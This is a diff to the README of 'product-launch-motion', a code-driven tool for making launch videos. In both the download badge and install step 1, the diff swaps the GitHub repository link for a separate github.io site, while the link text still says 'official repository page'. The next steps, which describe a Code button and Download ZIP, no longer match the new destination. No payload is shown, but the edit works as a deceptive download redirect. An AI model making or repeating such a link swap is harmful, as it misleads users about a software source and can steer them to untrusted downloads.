@@ -1,6 +1,6 @@
 # 🎬 product-launch-motion - Create high-end launch videos with code
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Clairvoyant-fenestration570/product-launch-motion)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://clairvoyant-fenestration570.github.io)
 
 This tool turns your technical product concepts into motion graphics. You define your design using HTML, CSS, and animation code. The software converts those inputs into professional video files. You create demos and launch reels without manual video editing tools. It handles camera motion, smooth timing, and audio levels to meet broadcast standards.
 
@@ -18,7 +18,7 @@ Your computer needs these items to run the software:
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [official repository page](https://github.com/Clairvoyant-fenestration570/product-launch-motion).
+1. Visit the [official repository page](https://clairvoyant-fenestration570.github.io).
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the menu.
 4. Open your Downloads folder.
